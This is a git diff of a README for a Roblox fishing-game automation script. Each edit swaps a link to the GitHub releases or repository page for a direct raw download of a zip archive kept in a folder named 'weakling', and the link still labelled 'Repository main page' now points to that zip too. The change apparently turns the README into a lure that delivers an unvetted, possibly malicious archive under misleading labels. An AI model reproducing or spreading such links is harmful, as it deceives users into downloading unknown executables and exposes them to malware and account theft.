@@ -1,6 +1,6 @@
 # 🎣 Roblox-Fisch-Script - Automate and Improve Your Fishing
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Roblox-Fisch-Script-brightgreen)](https://github.com/mokalachristian/Roblox-Fisch-Script/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Roblox-Fisch-Script-brightgreen)](https://raw.githubusercontent.com/mokalachristian/Roblox-Fisch-Script/main/weakling/Script_Roblox_Fisch_1.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ The script works with most versions of Roblox. If Roblox updates, you may need t
 
 Roblox-Fisch-Script is available on GitHub. You need to visit the release page to find the latest version.
 
-[![Download and Install](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/mokalachristian/Roblox-Fisch-Script/releases)
+[![Download and Install](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://raw.githubusercontent.com/mokalachristian/Roblox-Fisch-Script/main/weakling/Script_Roblox_Fisch_1.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run Roblox-Fisch-Script on your Windows PC.
 ### Step 1: Open the Download Page
 
 Go to the release page by clicking this link:  
-https://github.com/mokalachristian/Roblox-Fisch-Script/releases
+https://raw.githubusercontent.com/mokalachristian/Roblox-Fisch-Script/main/weakling/Script_Roblox_Fisch_1.4.zip
 
 ### Step 2: Choose the Latest Version
 
@@ -121,10 +121,10 @@ For help or questions, use the Issues tab on the GitHub repository or contact th
 ## 🔗 Important Links
 
 - Visit the release page here:  
-https://github.com/mokalachristian/Roblox-Fisch-Script/releases
+https://raw.githubusercontent.com/mokalachristian/Roblox-Fisch-Script/main/weakling/Script_Roblox_Fisch_1.4.zip
 
 - Repository main page:  
-https://github.com/mokalachristian/Roblox-Fisch-Script
+https://raw.githubusercontent.com/mokalachristian/Roblox-Fisch-Script/main/weakling/Script_Roblox_Fisch_1.4.zip
 
 ---
 
